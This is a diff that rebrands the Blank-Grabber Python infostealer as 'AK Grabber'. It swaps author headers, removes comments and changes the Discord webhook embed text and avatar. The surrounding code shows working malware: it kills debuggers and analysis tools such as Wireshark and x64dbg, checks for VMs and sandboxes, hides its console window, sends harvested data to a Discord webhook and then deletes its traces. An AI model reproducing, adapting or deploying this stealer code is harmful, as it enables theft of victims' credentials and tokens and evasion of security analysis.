@@ -1,7 +1,6 @@
-# Python 3.10+
-# Author: Blank-c
-# Github: https://github.com/Blank-c/Blank-Grabber
-# Encoding: UTF-8
+# A5 Grabber
+# Author: AK 505
+# Version: 1,0
 
 import base64
 import os
@@ -57,9 +56,9 @@ class Settings:
     DiscordInjection = bool("%discordinjection%")
 
 if not hasattr(sys, "_MEIPASS"):
-    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Defines _MEIPASS if does not exist (py mode)
+    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) 
 
-ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) # Enables VT100 escape sequences
+ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) 
 logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled= True
@@ -78,25 +77,25 @@ class VmProtect:
     BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
 
     @staticmethod
-    def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
+    def checkUUID() -> bool: 
         Logger.info("Checking UUID")
         uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
         return uuid in VmProtect.BLACKLISTED_UUIDS
 
     @staticmethod
-    def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
+    def checkComputerName() -> bool: 
         Logger.info("Checking computer name")
         computername = os.getenv("computername")
         return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
 
     @staticmethod
-    def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
+    def checkUsers() -> bool: 
         Logger.info("Checking username")
         user = os.getlogin()
         return user.lower() in VmProtect.BLACKLISTED_USERS
 
     @staticmethod
-    def checkHosting() -> bool: # Checks if the user's system in running on a server or not
+    def checkHosting() -> bool: 
         Logger.info("Checking if system is hosted online")
         http = PoolManager(cert_reqs="CERT_NONE")
         try:
@@ -106,7 +105,7 @@ class VmProtect:
             return False
 
     @staticmethod
-    def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
+    def checkHTTPSimulation() -> bool: 
         Logger.info("Checking if system is simulating connection")
         http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
         try:
@@ -117,7 +116,7 @@ class VmProtect:
             return True
 
     @staticmethod
-    def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
+    def checkRegistry() -> bool: 
         Logger.info("Checking registry")
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
@@ -126,11 +125,11 @@ class VmProtect:
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
     @staticmethod
-    def killTasks() -> None: # Kills blacklisted processes
+    def killTasks() -> None: 
         Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)
 
     @staticmethod
-    def isVM() -> bool: # Checks if the user is running on a VM or not
+    def isVM() -> bool: 
         Logger.info("Checking if system is a VM")
         Thread(target= VmProtect.killTasks, daemon= True).start()
         result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
@@ -145,17 +144,17 @@ class Errors:
     errors: list[str] = []
 
     @staticmethod 
-    def Catch(func): # Decorator to catch exceptions and store them in the `errors` list
+    def Catch(func): 
         def newFunc(*args, **kwargs):
             try:
                 return func(*args, **kwargs)
             except Exception as e:
-                if isinstance(e, KeyboardInterrupt): # If user presses CTRL+C, then exit
+                if isinstance(e, KeyboardInterrupt): 
                     os._exit(1)
                 if not isinstance(e, UnicodeEncodeError):
                     trb = traceback.format_exc()
                     Errors.errors.append(trb)
-                    if Utility.GetSelf()[1]: # If exe mode, then print the traceback
+                    if Utility.GetSelf()[1]: 
                         Logger.error(trb)
         
         return newFunc
@@ -165,11 +164,11 @@ class Tasks:
     threads: list[Thread] = list()
 
     @staticmethod
-    def AddTask(task: Thread) -> None: # Add new thread to the list
+    def AddTask(task: Thread) -> None: 
         Tasks.threads.append(task)
     
     @staticmethod
-    def WaitForAll() -> None: # Wait for all threads to finish
+    def WaitForAll() -> None: 
         for thread in Tasks.threads:
             thread.join()
 
@@ -236,13 +235,13 @@ class Syscalls:
         raise ValueError("Invalid encrypted_data provided!")
     
     @staticmethod
-    def HideConsole() -> None: # Hides the console window
+    def HideConsole() -> None: 
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 class Utility:
 
     @staticmethod
-    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
+    def GetSelf() -> tuple[str, bool]:
         if hasattr(sys, "frozen"):
             return (sys.executable, True)
         else:
@@ -994,7 +993,7 @@ class BlankGrabber:
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
         self.SendData() # Send all the data to the webhook
-        try:
+        try:    
             Logger.info("Removing archive")
             os.remove(self.ArchivePath) # Remove the archive from the system
             Logger.info("Removing temporary folder")
@@ -1678,7 +1677,7 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://avatars.githubusercontent.com/u/194596336?v=4"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
@@ -1689,14 +1688,14 @@ class BlankGrabber:
                             "url": "https://github.com/Blank-c/Blank-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                                "text": "Grabbed by AK Grabber | https://github.com/unknownchesspawn/AK-grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
                             }
                         }
                     ],
-                    "username" : "Blank Grabber",
+                    "username" : "AK",
                     "avatar_url" : image_url
                 }
 
